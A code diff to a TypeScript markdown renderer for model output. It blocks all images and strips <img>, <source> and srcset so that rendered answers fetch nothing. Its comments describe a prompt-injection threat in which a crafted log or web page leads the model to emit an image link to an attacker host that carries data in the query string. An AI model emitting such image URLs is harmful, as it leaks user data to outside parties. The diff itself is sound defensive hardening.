@@ -20,10 +20,12 @@ type PluginTuple = Extract<(typeof defaultRehypePlugins)[string], unknown[]>;
 
 // sc-157 (QA SEC-003): Streamdown's harden step allows every image by default, so a crafted
 // log or web page could make the model emit `![](https://attacker/?q=...)` and leak data the
-// moment it renders. We re-run harden with images limited to this origin; anything else
-// becomes a "[Image blocked: alt]" text span. (`data:` images were already dropped by
-// Streamdown's URL transform, and the app emits none.) Links keep the default (any
-// http/https), since they need a click.
+// moment it renders. We re-run harden with NO image allowed (allowedImagePrefixes: []); each
+// one becomes a "[Image blocked: alt]" text span. sc-272: this used to allow this origin, but
+// `![](/api/...pdf)` then fired an authenticated GET (a costly endpoint) as soon as it
+// rendered, and the app emits no images in markdown. (`data:` images were already dropped by
+// Streamdown's URL transform.) Links keep the default (any http/https), since they need a
+// click.
 // QA 2026-10-31b: protocols are harden's safe set plus Streamdown's own placeholder for a
 // half-streamed link, so the check holds even if sanitize stops running first.
 const ORIGIN = window.location.origin;
@@ -32,7 +34,7 @@ const HARDEN: PluginTuple = [
   harden,
   {
     defaultOrigin: ORIGIN,
-    allowedImagePrefixes: [ORIGIN],
+    allowedImagePrefixes: [],
     allowedLinkPrefixes: ["*"],
     allowedProtocols: ["streamdown:"],
     blockedImageClass: "text-muted-foreground",
@@ -40,15 +42,17 @@ const HARDEN: PluginTuple = [
 ];
 
 // QA BUG-001: harden only checks `img src`, but sanitize keeps `<picture><source srcset>`,
-// and the browser fetches a `<source>` before the (same-origin) `<img>`. Drop every
-// `<source>` and any `srcset`, after sanitize and harden, so only a checked `src` loads.
+// and the browser fetches a `<source>` before the `<img>`. sc-272: harden still lets an `img`
+// through for the schemes it passes as-is (`blob:`, Streamdown's `streamdown:` placeholder).
+// None of them can reach an app route, but "no images" is cheaper to hold than to argue, so
+// after sanitize and harden drop every `<img>` and `<source>` and any `srcset`.
 type HastElement = { tagName: string; properties: Record<string, unknown> };
 type HastParent = { children: unknown[] };
 
-function rehypeNoSrcset() {
+function rehypeNoImages() {
   return (tree: unknown) => {
     visit(tree as never, "element", (node: HastElement, index?: number, parent?: HastParent) => {
-      if (node.tagName === "source" && parent && index !== undefined) {
+      if ((node.tagName === "source" || node.tagName === "img") && parent && index !== undefined) {
         parent.children.splice(index, 1);
         return index;
       }
@@ -63,7 +67,7 @@ function rehypeNoSrcset() {
 // the ink-in has already played, and a span per word is costly on long answers (PERF-010).
 const STATIC_REHYPE_PLUGINS = [
   ...Object.values({ ...defaultRehypePlugins, harden: HARDEN }),
-  rehypeNoSrcset,
+  rehypeNoImages,
 ];
 const STREAMING_REHYPE_PLUGINS = [...STATIC_REHYPE_PLUGINS, rehypeWordSpans];
 
